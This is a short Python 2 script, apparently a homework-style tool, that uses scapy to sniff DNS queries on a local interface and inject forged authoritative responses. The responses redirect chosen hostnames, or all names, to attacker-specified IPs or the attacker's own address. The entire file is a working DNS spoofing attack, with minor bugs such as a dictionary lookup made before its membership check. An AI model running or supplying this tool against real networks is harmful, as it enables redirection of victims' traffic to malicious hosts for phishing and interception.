import sys
import os
import argparse
import socket
import scapy
from scapy.all import *
import netifaces as ni

hosts = {}
my_ip = '127.0.0.1'
soc = None

def get_args():
	parser = argparse.ArgumentParser(add_help=False);
	parser.add_argument('-i', metavar='eth0');
	parser.add_argument('-h', metavar='192.168.10.1');
	parser.add_argument('expression', nargs='*', action='store');
	arg = parser.parse_args();
	if (arg.h):
		print arg.h
		with open(arg.h) as fp:
			for line in fp:
				line = line.split();
				if len(line) != 2:
					continue;
				hosts[line[1].strip()] = line[0].strip();

	if (arg.expression):
		#print "Expression",
		print arg.expression
	return arg.i, arg.h, arg.expression;

def dns_packet(packet):
	global hosts, my_ip, soc
	if ((UDP in packet) and (packet.dport == 53) and (DNSRR not in packet)):
		print "Query", hosts[packet[DNSQR].qname[:-1]]
		if (packet[DNSQR].qname[:-1] in hosts):
			spoofed_ip = hosts[packet[DNSQR].qname[:-1]];
		elif (len(hosts) == 0):
			spoofed_ip = my_ip;
		else:
			print "Will Not Inject"
			return
		
		print "Spoofed IP is", spoofed_ip;
		spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
			UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
			DNS(id=packet[DNS].id,
				qd=DNSQR(qname=packet[DNSQR].qname),
				aa = 1,
				qr = 1,
				an=DNSRR(rrname=packet[DNS].qd.qname, rdata=spoofed_ip));
		send(spoofed_pkt);
"""
		spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
			UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
			DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr = 1, \
			an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
"""

if __name__ == '__main__':
	[i, h, exp] = get_args();
	soc = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW);
	if (i) :
		my_ip = ni.ifaddresses(i)[2][0]['addr'];
		sniff(filter = 'udp port 53', iface = conf.iface, prn = dns_packet);
	else :
		print conf.iface
		my_ip = ni.ifaddresses(conf.iface)[2][0]['addr'];
		print my_ip
		sniff(filter = 'udp port 53', iface = i, prn = dns_packet);

